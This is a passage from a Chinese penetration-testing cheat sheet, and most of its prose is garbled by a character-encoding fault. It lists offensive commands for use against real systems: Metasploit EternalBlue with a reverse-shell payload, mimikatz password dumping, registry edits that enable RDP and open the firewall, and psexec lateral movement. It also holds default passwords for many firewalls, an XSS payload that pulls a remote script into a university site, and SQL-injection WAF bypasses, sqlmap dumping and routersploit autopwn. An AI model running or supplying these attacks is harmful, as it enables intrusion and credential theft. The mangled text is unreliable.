- **TTLæ¥åˆ¤æ–­ç›®çš„ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹**
ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š
```bash
1ã€WINDOWS NT/2000   TTLï¼š128
2ã€WINDOWS 95/98     TTLï¼š32
3ã€UNIX              TTLï¼š255
4ã€LINUX             TTLï¼š64
5ã€WIN7              TTLï¼š64
```

- **ä¿®æ”¹æœ¬æœºç”µè„‘ä¸Šé¢çš„é»˜è®¤TTLå€¼**
é€šè¿‡ä¿®æ”¹æœ¬æœºä¸Šçš„TTLå€¼å¯ä»¥æ··æ·†æ”»å‡»è€…çš„åˆ¤æ–­ï¼ˆå½“ç„¶ï¼Œå¾ˆå°‘æœ‰ç”¨æˆ·ä¼šè¿™ä¹ˆåšï¼‰ã€‚TTL å€¼åœ¨æ³¨å†Œè¡¨çš„ä½ç½®æ˜¯ï¼š`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `å…¶ä¸­æœ‰ä¸ª DefaultTTL çš„ DWORD å€¼ï¼Œå…¶æ•°æ®å°±æ˜¯é»˜è®¤çš„ TTL å€¼äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ DefaultTTL é‡Œé¢çš„ TTL é»˜è®¤å€¼ï¼Œä½†ä¸èƒ½å¤§äºåè¿›åˆ¶çš„ 255ã€‚

#### IPæ‰«
>netdiscover -r 1.1.1.0/24

### ç½‘ç«™
#### CDN/æŸ¥æºIP
- **Nslookupæ³•**
`nslookup + åŸŸå`

- **å¤šåœ°pingåŸŸåæ³•**
åˆ©ç”¨åœ¨çº¿ç½‘ç«™æœåŠ¡å¤šåœ° ping æµ‹è¯•

- **"å¸¸è¯†"åˆ¤æ–­æ³•**
åœ¨åæŸ¥ç½‘ç«™ ip æ—¶ï¼Œå¦‚æœæ­¤ç½‘ç«™æœ‰ 1000 å¤šä¸ªä¸åŒåŸŸåï¼Œé‚£ä¹ˆè¿™ä¸ª ip å¤šåŠä¸æ˜¯çœŸå® ipã€‚
å¦‚æœä¸€ä¸ª asp æˆ–è€… asp.net ç½‘ç«™è¿”å›çš„å¤´å­—æ®µçš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œé‚£ä¹ˆå¤šåŠæ˜¯ç”¨äº† nginx åå‘ä»£ç†ï¼Œè€Œä¸æ˜¯çœŸå® ipã€‚
å¦‚æœ ip å®šä½æ˜¯åœ¨å¸¸è§ cdn æœåŠ¡å•†çš„æœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆæ˜¯çœŸå® ip çš„å¯èƒ½æ€§å°±å¾®ä¹å…¶å¾®äº†ã€‚

- **å­åŸŸåæŸ¥æ‰¾æ³•**
åˆ©ç”¨ä¸€äº›åœ¨çº¿æŸ¥è¯¢çš„ç½‘ç«™
https://x.threatbook.cn/
https://dnsdb.io/zh-cn/ åªéœ€è¾“å…¥ baidu.com type:A å°±èƒ½æ”¶é›†ç™¾åº¦çš„å­åŸŸåå’Œ ip
Google æœç´¢ Google site:baidu.com -www å°±èƒ½æŸ¥çœ‹é™¤ www å¤–çš„å­åŸŸå

- **ä½¿ç”¨å­åŸŸåæ‰«æå™¨**
ä¾‹å¦‚å­åŸŸåæŒ–æ˜æœºå’Œ subdomainbrute(https://github.com/lijiejie/subDomainsBrute)

æ€»ç»“ï¼šæ”¶é›†å­åŸŸååå°è¯•ä»¥è§£æ ip ä¸åœ¨ CDN ä¸Šçš„ ip è§£æä¸»ç«™ï¼ŒçœŸå® ip æˆåŠŸè¢«è·å–åˆ°ã€‚

### ä¸»æœº
#### ç«¯å£æ‰«
`nmap -T5 -A -v 1.1.1.1`

#### windows
```bash
systeminfo
```

##### åŸŸä¿¡æ¯
- åŸŸç”¨æˆ·åˆ—è¡¨
    a.åˆ†æç‰¹æƒç”¨æˆ·ç»„
    b.å®šä½æŒ‡å®šç”¨æˆ·

- ADä¿¡æ¯æ”¶é›†
    a.GPO
    b.ç‰¹æƒä»¤ç‰Œ
    c.ä¿¡ä»»å…³ç³»
    d.å®šä½æŒ‡å®šæœºå™¨

---

# 6å†…/å¤–ç½‘
## WAN
### dns
**CVE-1999-0532  dnsåŸŸä¼ é€æ¼æ´**
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@æŒ‡å®šåŸŸåæœåŠ¡å™¨ï¼›axfr ä¸ºåŸŸä¼ é€æŒ‡ä»¤ï¼›xxx.edu.cnè¡¨ç¤ºè¦æŸ¥è¯¢çš„åŸŸåï¼›
```

---

## windowsæ¸—é€
### exp
#### å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„exp
å¯ä»¥æœ€å®‰å…¨çš„å‡å°‘ç›®æ ‡æœºçš„æœªçŸ¥é”™è¯¯ï¼Œä»¥å…å½±å“ä¸šåŠ¡ã€‚
å‘½ä»¤è¡Œä¸‹æ‰§è¡Œæ£€æµ‹æœªæ‰“è¡¥ä¸çš„å‘½ä»¤å¦‚ä¸‹ï¼š
>systeminfo>micropoor.txt&(forÂ %iÂ inÂ (KB977165Â KB2160329Â KB2503665Â KB2592799 KB2707511Â KB2829361Â KB2850851Â KB3000061Â KB3045171Â KB3077657Â KB3079904 KB3134228Â KB3143141Â KB3141780)Â doÂ @typeÂ micropoor.txt|@findÂ /iÂ Â "%i"||Â @echo %iÂ youÂ canÂ fuck)&delÂ /fÂ /qÂ /aÂ micropoor.txt

æ³¨ï¼šä»¥ä¸Šéœ€è¦åœ¨å¯å†™ç›®å½•æ‰§è¡Œã€‚éœ€è¦ä¸´æ—¶ç”Ÿæˆ micrpoor.txtï¼Œä»¥ä¸Šè¡¥ä¸ç¼–å·è¯·æ ¹æ®ç¯å¢ƒæ¥å¢
åˆ ã€‚
ä¸€èˆ¬å®æˆ˜ä¸­åœ¨ç±»ä¼¼Â tmpç›®å½•ç­‰å¯å†™ç›®å½•ä¸‹æ‰§è¡Œï¼šå¦‚`C:\tmp>`

#### å¸¸ç”¨exp
**RCE**
- MS17-010 eternalblue
```bash
å‘ç°ï¼Œæ£€æµ‹
use auxiliary/scanner/smb/smb_ms17_010

ä½¿ç”¨payloadè¿ä¸Šå»
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set lhost   #è®¾ä¸€ä¸‹æœ¬æœºåœ°å€
set rhosts 
run

msf ä¸‹
åŠ è½½mimikatzæ¨¡å—
load mimikatz
kerberos
```
- MS15-034 Vulnerability in HTTP.sys could allow remote code execution

**ææƒ**
- MS14-058
- MS15-051
- MS15-097
- MS16-014
- MS16-016
- MS16-032
- MS16-135
- MS17-017
- CVE-2017-0213
- CVE-2018-8120

**é»‘å±**
- MS12-020

#### expæ³¨
```bash
MS17-017Â ã€€[KB4013081]ã€€ã€€[GDIÂ PaletteÂ ObjectsÂ LocalÂ PrivilegeÂ Escalation]ã€€
(windowsÂ 7/8)
CVE-2017-8464Â ã€€[LNKÂ RemoteÂ CodeÂ ExecutionÂ Vulnerability]ã€€ã€€(windows
10/8.1/7/2016/2010/2008)
CVE-2017-0213Â ã€€[WindowsÂ COMÂ ElevationÂ ofÂ PrivilegeÂ Vulnerability]ã€€ã€€(windows
10/8.1/7/2016/2010/2008)
MS17-010Â ã€€[KB4013389]ã€€ã€€[WindowsÂ KernelÂ ModeÂ Drivers]ã€€ã€€(windows
7/2008/2003/XP)
MS16-135Â ã€€[KB3199135]ã€€ã€€[WindowsÂ KernelÂ ModeÂ Drivers]ã€€ã€€(2016)
MS16-111Â ã€€[KB3186973]ã€€ã€€[kernelÂ api]ã€€ã€€(WindowsÂ 10Â 10586Â (32/64)/8.1)
MS16-098Â ã€€[KB3178466]ã€€ã€€[KernelÂ Driver]ã€€ã€€(WinÂ 8.1)
MS16-075Â ã€€[KB3164038]ã€€ã€€[HotÂ Potato]ã€€ã€€(2003/2008/7/8/2012)
MS16-034Â ã€€[KB3143145]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2008/7/8/10/2012)
MS16-032Â ã€€[KB3143141]ã€€ã€€[SecondaryÂ LogonÂ Handle]ã€€ã€€(2008/7/8/10/2012)
MS16-016Â ã€€[KB3136041]ã€€ã€€[WebDAV]ã€€ã€€(2008/Vista/7)
MS15-097Â ã€€[KB3089656]ã€€ã€€[remoteÂ codeÂ execution]ã€€ã€€(win8.1/2012)
MS15-076Â ã€€[KB3067505]ã€€ã€€[RPC]ã€€ã€€(2003/2008/7/8/2012)
MS15-077Â ã€€[KB3077657]ã€€ã€€[ATM]ã€€ã€€(XP/Vista/Win7/Win8/2000/2003/2008/2012)
MS15-061Â ã€€[KB3057839]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2003/2008/7/8/2012)
MS15-051Â ã€€[KB3057191]ã€€ã€€[WindowsÂ KernelÂ ModeÂ Drivers]ã€€
(2003/2008/7/8/2012)
MS15-010Â ã€€[KB3036220]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2003/2008/7/8)
MS15-015Â ã€€[KB3031432]ã€€ã€€[KernelÂ Driver]ã€€ã€€(Win7/8/8.1/2012/RT/2012Â R2/2008
R2)
MS15-001Â ã€€[KB3023266]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2008/2012/7/8)
MS14-070Â ã€€[KB2989935]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2003)
MS14-068Â ã€€[KB3011780]ã€€ã€€[DomainÂ PrivilegeÂ Escalation]ã€€ã€€(2003/2008/2012/7/8)
MS14-058Â ã€€[KB3000061]ã€€ã€€[Win32k.sys]ã€€ã€€(2003/2008/2012/7/8)
MS14-040Â ã€€[KB2975684]ã€€ã€€[AFDÂ Driver]ã€€ã€€(2003/2008/2012/7/8)
MS14-002Â ã€€[KB2914368]ã€€ã€€[NDProxy]ã€€ã€€(2003/XP)
MS13-053Â ã€€[KB2850851]ã€€ã€€[win32k.sys]ã€€ã€€(XP/Vista/2003/2008/winÂ 7)
MS13-046Â ã€€[KB2840221]ã€€ã€€[dxgkrnl.sys]ã€€ã€€(Vista/2003/2008/2012/7)
MS13-005Â ã€€[KB2778930]ã€€ã€€[KernelÂ ModeÂ Driver]ã€€ã€€(2003/2008/2012/win7/8)
MS12-042Â ã€€[KB2972621]ã€€ã€€[ServiceÂ Bus]ã€€ã€€(2008/2012/win7)
MS12-020Â ã€€[KB2671387]ã€€ã€€[RDP]ã€€ã€€(2003/2008/7/XP)
MS11-080Â ã€€[KB2592799]ã€€ã€€[AFD.sys]ã€€ã€€(2003/XP)
MS11-062Â ã€€[KB2566454]ã€€ã€€[NDISTAPI]ã€€ã€€(2003/XP)
MS11-046Â ã€€[KB2503665]ã€€ã€€[AFD.sys]ã€€ã€€(2003/2008/7/XP)
MS11-011Â ã€€[KB2393802]ã€€ã€€[kernelÂ Driver]ã€€ã€€(2003/2008/7/XP/Vista)
MS10-092Â ã€€[KB2305420]ã€€ã€€[TaskÂ Scheduler]ã€€ã€€(2008/7)
MS10-065Â ã€€[KB2267960]ã€€ã€€[FastCGI]ã€€ã€€(IISÂ 5.1,Â 6.0,Â 7.0,Â andÂ 7.5)
MS10-059Â ã€€[KB982799]ã€€ã€€Â [ACL-Churraskito]ã€€ã€€(2008/7/Vista)
MS10-048Â ã€€[KB2160329]ã€€ã€€[win32k.sys]ã€€ã€€(XPÂ SP2Â &Â SP3/2003Â SP2/VistaÂ SP1Â &
SP2/2008Â GoldÂ &Â SP2Â &Â R2/Win7)
MS10-015Â ã€€[KB977165]ã€€ã€€Â [KiTrap0D]ã€€ã€€(2003/2008/7/XP)
MS10-012Â ã€€[KB971468]ã€€ã€€[SMBÂ ClientÂ Trans2Â stackÂ overflow]ã€€ã€€(Windows
7/2008R2)
MS09-050Â ã€€[KB975517]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(2008/Vista)
MS09-020Â ã€€[KB970483]ã€€ã€€Â [IISÂ 6.0]ã€€ã€€(IISÂ 5.1Â andÂ 6.0)
MS09-012Â ã€€[KB959454]ã€€ã€€Â [Chimichurri]ã€€ã€€(Vista/win7/2008/Vista)
MS08-068Â ã€€[KB957097]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(2000/XP)
MS08-067Â ã€€[KB958644]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(WindowsÂ 2000/XP/Server
2003/Vista/ServerÂ 2008)
MS08-066Â ã€€[]ã€€ã€€Â []ã€€ã€€(WindowsÂ 2000/XP/ServerÂ 2003)
MS08-025Â ã€€[KB941693]ã€€ã€€Â [Win32.sys]ã€€ã€€(XP/2003/2008/Vista)
MS06-040Â ã€€[KB921883]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(2003/xp/2000)
MS05-039Â ã€€[KB899588]ã€€ã€€Â [PnPÂ Service]ã€€ã€€(WinÂ 9X/ME/NT/2000/XP/2003)
MS03-026Â ã€€[KB823980]ã€€ã€€Â [BufferÂ OverrunÂ InÂ RPCÂ Interface]ã€€
(/NT/2000/XP/2003)
```

---

### RDP
**cmdå¼€RDP**
> REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber 

æµ‹è¯•å¯ä»¥ï¼š
- å¼€å¯3389ç«¯å£doså‘½ä»¤ï¼ˆå¼€å¯XP&2003ç»ˆç«¯æœåŠ¡ï¼‰
    1. æ–¹æ³•ä¸€ï¼š`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
    2. æ–¹æ³•äºŒï¼š`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
    
- æŸ¥çœ‹3389ç«¯å£æ˜¯å¦å¼€å¯
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*å¦‚æœæ˜¯0x0åˆ™å¼€å¯`

- æ›´æ”¹ç»ˆç«¯ç«¯å£ä¸º2008(åå…­è¿›åˆ¶ä¸ºï¼š0x7d8)
    1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
    2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

- æŸ¥çœ‹3389ç«¯å£æ˜¯å¦æ›´æ”¹
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*å‡ºæ¥çš„ç»“æœæ˜¯16è¿›åˆ¶`

- å–æ¶ˆxp&2003ç³»ç»Ÿé˜²ç«å¢™å¯¹ç»ˆç«¯æœåŠ¡çš„é™åˆ¶åŠIPè¿æ¥çš„é™åˆ¶ï¼š
    `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

æ­¤æ—¶å¯ä»¥é“¾æ¥3389
ç„¶åæŠ“å–å¯†ç 
```bash
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //æ‰“å°è¾“å‡ºmimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //è¾“å‡ºåˆ°log.txt
```

**å¤šå¼€3389**
ç”¨å‘½ä»¤æ²¡æˆåŠŸï¼Œè¿˜æ˜¯ç”¨å·¥å…·æŠŠã€‚

### å¯†ç 
#### mimikatz
ææƒ
`privilege::debug`

æŠ“å–å¯†ç 
`sekurlsa::logonpasswords`

### åŸŸæ¸—é€
```bash
#å¦‚æœæ²¡æœ‰psexecå·¥å…·è®°å¾—æ‰¾pstoolå·¥å…·åŒ…ï¼Œä¼ ä¸€ä¸ªä¸Šå»
psexec \\hostIp -u [username] -p [password] cmd
```

---

## webæ¸—é€
### pos
#### å„ç±»è®ºå›/CMS/ç³»ç»Ÿ
**CMS-Hunter**

**CMS-Exploit-Framework**

##### phpmyadmin
**LOAD DATA INFILE ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´**
poc:https://github.com/Gifts/Rogue-MySql-Server

**4.8.x æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨**
[phpMyAdmin 4.8.x æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/)å¯ä»¥é€šè¿‡è¿™ä¸ªçº¿ä¸Šé¶åœºå®éªŒ,ä¸è¿‡dockeré•œåƒå¯èƒ½æœ‰ç‚¹é—®é¢˜,mysqlè¿›ç¨‹èµ·ä¸èµ·æ¥,æˆ‘çš„è§£å†³æ–¹å¼æ˜¯ç›´æ¥å¸äº†é‡è£…mysql-server,è€Œä¸”ä»–é»˜è®¤çš„aptæºæ— æ³•è®¿é—®,è¿˜è¦æ¢ä¸€ä¸‹aptæº

### å®‰é˜²è®¾å¤‡
**é»˜è®¤å£ä»¤**
```bash
å¤©èä¿¡é˜²ç«å¢™
8080
ç”¨æˆ·å:superman å¯†ç :talentã€talent!23
test/123456

è”æƒ³ç½‘å¾¡é˜²ç«å¢™
8889
ç”¨æˆ·å:admin    å¯†ç :leadsec@7766ã€administratorã€bane@7766

æ·±ä¿¡æœé˜²ç«å¢™
ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šadmin

å¯æ˜æ˜Ÿè¾°
8889
ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šbane@7766ã€admin@123

juniper
ç”¨æˆ·å:netscreen    å¯†ç :netscreen

Cisco
ç”¨æˆ·å:admin    å¯†ç :cisco

Huawei
ç”¨æˆ·å:admin    å¯†ç :Admin@123
eudemon eudemon

H3C
ç”¨æˆ·å:admin    å¯†ç :admin

ç»¿ç›ŸIPS
ç”¨æˆ·å: weboper å¯†ç : weboper

ç½‘ç¥é˜²ç«å¢™
ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šfirewall

åä¸ºVPN
è´¦å·ï¼šroot  å¯†ç ï¼šmduadmin

è¿ªæ™®
admin/admin_default

å±±çŸ³
hillstone/hillstone

å®‰æ’æ˜å¾¡é˜²ç«å¢™
admin/adminadmin

é½æ²»å ¡å’æœº
shterm/shterm
```

**ç»•waf**
- éé»˜è®¤ç«¯å£å¯¼è‡´å®Œå…¨ç»•è¿‡
    æµ‹è¯•HTTPSæœåŠ¡
    æµ‹è¯•8080/8081ç­‰ç«¯å£çš„æœåŠ¡

- è·¯å¾„é™åˆ¶ç»•è¿‡
è¿™åªWAFä¼šå¯¹è®¿é—®æ•æ„Ÿè·¯å¾„åŠ ä»¥é™åˆ¶,ä½†æ˜¯åŠ ä¸Šå‚æ•°å¯ä»¥ç»•è¿‡ã€‚
æ¯”å¦‚æƒ³è®¿é—®`xxx.â–ˆâ–ˆ.edu.cn/phpmyadmin/`ä¼šè¢«æ‹¦æˆªï¼Œè®¿é—®`xxx.â–ˆâ–ˆ.edu.cn/phpmyadmin/?id=1`å¯ä»¥ç»•è¿‡

- XSSé˜²æŠ¤ç»•è¿‡
æœ€ç›´ç™½çš„payloadç±»ä¼¼`<script> alert('xss'); </script>`
ä½†æ˜¯ä½ å¯ä»¥ç”¨`<script src=æ¥è¿œç¨‹åŠ è½½è„šæœ¬ï¼Œå¹¶ç»•è¿‡é˜²æŠ¤`
`http://â–ˆâ–ˆ.â–ˆâ–ˆ.edu.cn/â–ˆâ–ˆ/â–ˆâ–ˆ?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`

- SQLæ³¨å…¥ç»•è¿‡
Unionæ³¨å…¥æ—¶`union select 1 from 2`æ›¿æ¢æˆ`union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
order byæµ‹è¯•æ—¶ç›´æ¥æŠŠç©ºæ ¼æ¢æˆ`/**//**/`

**Reference**
- [å›½å†…é˜²ç«å¢™é»˜è®¤å¯†ç ](https://www.qugcloud.cn/2018/05/19/firewall-pwd/)
- [â–ˆâ–ˆå¤§å­¦é€šç”¨å‹WAFä¸å®Œå…¨ç»•è¿‡ï¼ˆæŒç»­éå®šæœŸæ›´æ–°ï¼‰ ](https://drivertom.blogspot.com/2018/12/waf.html)

### æ³¨å…¥
#### sql
**sqlmap**
```bash
sqlmap -u URL	#åˆ¤æ–­æ³¨å…¥
sqlmap -u URL --current-db	 #è·å–å½“å‰æ•°æ®åº“
sqlmap -u URL -D DATABASE --tables		#è·å–æ•°æ®åº“è¡¨
sqlmap -u URL -D DATABASE -T TABLES --columns	#è·å–æŒ‡å®šè¡¨çš„åˆ—å
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump		#è·å–æŒ‡å®šè¡¨çš„åˆ—å

sqlmap -r aaa.txt  #postå‹æ³¨å…¥
```

---

## ä¸šåŠ¡æ¸—é€
### æ•°æ®åº“
#### oracle
**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
```bash
use auxiliary/admin/oracle/tnscmd   #è¯¥æ¼æ´å¯ä»¥è¿œç¨‹è·å–åˆ°oracleçš„å†…å­˜ä¿¡æ¯ï¼Œè‹¥æ˜¯èƒ½è·å–åˆ°å†…å­˜ä¸­çš„æ•°æ®å³ä¸ºå­˜åœ¨æ¼æ´ã€‚
use auxiliary/admin/oracle/sid_brute  #çˆ†ç ´oracleçš„SID
```

### openssl
MassBleed
sslscan
testssl

---

## çº¯ç½‘æ¸—é€
### SNMP
**snmpå¼±å£ä»¤**
Installation net-snmp
`yum -y install net-snmp-utils`

Usage
```bash
snmpwalk -v 2 -c public 192.168.xxx.xxx
snmp-check 192.168.xxx.xxx -c public -v 2c
```

**Reference**
- [SNMPåè®®æ”»å‡»](https://xz.aliyun.com/t/1562)
- [çƒ‚æ³¥ï¼šä½¿ç”¨snmpwalké‡‡é›†è®¾å¤‡çš„OIDä¿¡æ¯](https://www.ilanni.com/?p=8408)
- [æ¸—é€æµ‹è¯•ä¸­å¦‚ä½•æ”¶é›†åˆ©ç”¨SNMPåè®®æ•°æ®](https://www.freebuf.com/articles/network/104522.html)
- [snmpå¼±å£ä»¤å¼•èµ·çš„ä¿¡æ¯æ³„æ¼](http://drops.xmd5.com/static/drops/tips-409.html)

---

# 7å·¥æ§/IoT/ç‰©ç†
## ç‰©è”ç½‘è®¾å¤‡
### Printer
**PRET**
Installation
```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

pip install colorama pysnmp
```

Usage
```bash
python2 ./pret.py
python2 ./pret.py xxx.xxx.xxx.xxx pjl
python2 ./pret.py xxx.xxx.xxx.xxx ps
python2 ./pret.py xxx.xxx.xxx.xxx pcl
```

### Router
**routersoloit**
Installation
```bash
git clone https://www.github.com/threat9/routersploit.git
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

Usage
```bash
use scanners/autopwn
set target
run
```

`ä½ ä»¥ä¸ºå¾ˆå¤šäº‹æ˜¯å¯ä»¥é‡å¤çš„ï¼Œè¿˜æœ‰ä¸‹ä¸€æ¬¡ï¼Œä½†ä½ é”™äº†ã€‚åŒ…æ‹¬ä½ å„¿æ—¶çš„ä¸‡èŠ±ç­’æˆ–çº¸é£æœºï¼ŒæŠ„ä½œä¸šæˆ–ä¹°ç³–æœï¼Œæ—©å°±æ˜¯æ­¤ç”Ÿçš„æœ€åä¸€æ¬¡ã€‚ï¼ˆéŸ©å°‘åŠŸ ã€Šæ—¥å¤œä¹¦ã€‹ï¼‰ `
